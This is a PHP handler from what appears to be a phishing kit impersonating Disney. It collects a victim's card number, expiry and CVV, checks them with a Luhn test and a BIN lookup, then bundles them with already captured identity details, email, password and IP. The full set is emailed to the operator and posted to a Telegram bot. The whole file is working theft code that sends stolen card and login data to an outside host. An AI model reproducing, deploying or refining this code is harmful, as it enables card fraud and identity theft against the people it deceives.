<?php
include("../settings.php");
include("../common/sub_includes.php");

if(isset($_POST))
{

	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['nomcc'] = htmlspecialchars($_POST['input_cc_name']);
	$_SESSION['ccnum'] = htmlspecialchars(str_replace(' ', '',$_POST['input_cc_num']));
	$_SESSION['ccexp'] = htmlspecialchars($_POST['input_cc_exp']);
	$_SESSION['cvv'] = htmlspecialchars($_POST['input_cc_cvv']);


if(empty($_SESSION['nomcc']) || empty($_SESSION['ccnum']) || empty($_SESSION['ccexp']) || empty($_SESSION['cvv']) )
{

}
else{


    function is_valid_luhn($number) {
      settype($number, 'string');
      $sumTable = array(
        array(0,1,2,3,4,5,6,7,8,9),
        array(0,2,4,6,8,1,3,5,7,9));
      $sum = 0;
      $flip = 0;
      for ($i = strlen($number) - 1; $i >= 0; $i--) {
        $sum += $sumTable[$flip++ & 0x1][$number[$i]];
      }
      return $sum % 10 === 0;
  }

  if(is_valid_luhn($_SESSION['ccnum']) && is_numeric($_SESSION['ccnum']) && strlen($_SESSION['ccnum'] >= 16)){


        $cc = $_SESSION['ccnum'];
        $bin = substr($cc, 0, 6);

        $ch = curl_init();

        $url = "https://lookup.binlist.net/$bin";

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');


        $headers = array();
        $headers[] = 'Accept-Version: 3';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $result = curl_exec($ch);


        if (curl_errno($ch)) {
            echo 'Error:' . curl_error($ch);
        }


        curl_close($ch);

        $brand = '';
        $type = '';
        $emoji = '';
        $bank = '';


        $someArray = json_decode($result, true);

        $emoji = $someArray['country']['emoji'];
        $brand = $someArray['brand'];
        $type = $someArray['type'];
        $bank = $someArray['bank']['name'];
        $bank_phone = $someArray['bank']['phone'];
        $subject_title = "[BIN: $bin][$emoji $brand $type]";

        $_SESSION["bank"] = $bank;
        $_SESSION["brand"] = $brand;
        $_SESSION["type"] = $type;


        ######################
				#### MAIL SENDING ####
				######################


        if($mail_sending == true){

          $message = "

[💽] Carte [💽]

💽 Nom : ".$_SESSION['nomcc']."
💽 Numéro : ".$_SESSION['ccnum']."
💽 Date d'expiration : ".$_SESSION['ccexp']."
💽 CVV : ".$_SESSION['cvv']."

💽 Level : ".$brand."
💽 Banque : ".$bank."
💽 Type : ".$type."

[🪔] Full [🪔]

🪔  Nom : ".$_SESSION['nom']."
🪔  Prénom : ".$_SESSION['prenom']."
🪔  Date de naissance : ".$_SESSION['birthday']."

🪔 Numéro de téléphone : ".$_SESSION['phone']."
🪔 Adresse : ".$_SESSION['adresse']."
🪔 Code Postal : ".$_SESSION['zip']."
🪔 Ville : ".$_SESSION['city']."

[📲] Login [📲]

📲 Email : ".$_SESSION['email']."
📲 Mot de passe : ".$_SESSION['password']."

[💻] Informations additionnelles [💻]

💻 IP : ".$_SESSION['ip']."
💻 User-agent : ".$_SESSION['useragent']."

      
          ";
  
  
          $subject = "「💽」 +1 CC • ".$bin." • ".$bank." • ".$brand." • ".$_SESSION['ip'];
					$headers = "From: Disney <jugular@disney.fr>";
          mail($rezmail, $subject, $message, $headers);

        }

				##########################
				#### TELEGRAM SENDING ####
				##########################

        
				if($telegram_sending == true){

          $data = [
            'text' => '

[💽] Carte [💽]

💽 Nom/Prénom : '.$_SESSION['nomcc'].'
💽 Numéro : '.$_SESSION['ccnum'].'
💽 Expiration : '.$_SESSION['ccexp'].'
💽 CVV : '.$_SESSION['cvv'].'

💽 Banque : '.$bank.'
💽 Niveau : '.$brand.'
💽 Type : '.$type.'

[🪔] Full [🪔]

🪔 Nom : '.$_SESSION['nom'].'
🪔 Prénom : '.$_SESSION['prenom'].'
🪔 Date De Naissance : '.$_SESSION['birthday'].'

🪔 Téléphone : '.$_SESSION['phone'].'
🪔 Adresse : '.$_SESSION['adresse'].'
🪔 Ville : '.$_SESSION['city'].'
🪔 Code Postal : '.$_SESSION['zip'].'

[📲] Login [📲]

📲 E-Mail : '.$_SESSION['email'].'
📲 Mot de passe : '.$_SESSION['password'].'

[💻] Informations additionnelles [💻]

💻 Adresse Ip : '.$_SESSION['ip'].'
💻 User-agent : '.$_SESSION['useragent'].'


            ',
            'chat_id' => $chat_card
          ];

          file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}

        $_SESSION["carded"] = true;

        echo json_encode(array('success' => 1));



  }
  else{
    echo json_encode(array('success' => 0));

  }

}

}
else{
	echo 'Error 404 : File not found';
}




?>

<script type="text/javascript">
  window.location.href = "check.php";
</script>